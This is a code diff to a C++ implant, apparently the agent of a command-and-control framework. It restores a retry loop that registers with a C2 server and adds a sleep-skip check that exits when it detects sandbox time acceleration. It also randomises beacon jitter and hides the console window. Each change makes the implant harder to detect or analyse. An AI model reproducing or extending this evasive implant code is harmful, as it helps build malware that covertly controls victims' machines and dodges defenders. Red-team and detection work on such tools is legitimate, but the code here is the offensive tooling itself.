@@ -5,6 +5,7 @@
 #include <sodium.h>
 #include <string.h>
 #include <vector>
+#include <time.h>
 #include "obfuscator/MetaString.h"
 #include "rapidjson/rapidjson.h"
 #include "rapidjson/document.h"
@@ -51,6 +52,7 @@ int main()
 	#ifndef DEBUG
 	 Sleep(INITIAL_SLEEP_SECONDS * 1000);
 	 FreeConsole();
+	 srand(time(NULL));
 	#endif
 
 	if (sodium_init() < 0)
@@ -85,42 +87,49 @@ int main()
 		exit(1);
 	}
 
-	// while (TRUE) {
-	// 	int tries = 0;
-	// 	currentProfile = Register(toWide(C2_URL), pubKey, privKey);
+	while (TRUE) {
+		int tries = 0;
+		currentProfile = Register(toWide(C2_URL), pubKey, privKey);
 
-	// 	if (currentProfile == NULL)
-	// 	{
-	// 		DEBUG_PRINTF("Error registering, aborting\n");
-	// 		if (tries >= REGISTER_MAX_RETRIES){
-	// 			DEBUG_PRINTF("Max retries reached, exiting\n");
-	// 			exit(1);
-	// 		}
-	// 		tries++;
-	// 	} else {
-	// 		break;
-	// 	}
-	// }
+		if (DetectSleepSkip(1000)){
+			DEBUG_PRINTF("Sleep skipped, exiting\n");
+			exit(1);
+		}
+
+		if (currentProfile == NULL)
+		{
+			DEBUG_PRINTF("Error registering, aborting\n");
+			if (tries >= REGISTER_MAX_RETRIES){
+				DEBUG_PRINTF("Max retries reached, exiting\n");
+				exit(1);
+			}
+			tries++;
+		} else {
+			break;
+		}
+	}
 	
 
-	currentProfile = Register(toWide(C2_URL), pubKey, privKey);
-	if (currentProfile == NULL)
-	{
-		DEBUG_PRINTF("Error registering, aborting\n");
-		exit(1);
-	}
+	// currentProfile = Register(toWide(C2_URL), pubKey, privKey);
+	// if (currentProfile == NULL)
+	// {
+	// 	DEBUG_PRINTF("Error registering, aborting\n");
+	// 	exit(1);
+	// }
 
 
 	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());
 
-	// do stuff with the response
-	Sleep(1);
 
 	// Checkin loop
 	while (TRUE)
 	{
 		#ifndef DEBUG
-			float sleeptime = currentProfile->sleep + (currentProfile->sleep * currentProfile->jitter);
+			// Get random float between 0 and currentProfile->jitter
+			float maxJitter = currentProfile->jitter;
+			float jitter = (float)rand() / (float)RAND_MAX;
+			jitter = jitter * maxJitter;
+			float sleeptime = currentProfile->sleep + (currentProfile->sleep * jitter );
 		#else
 			float sleeptime = 5.f;
 		#endif
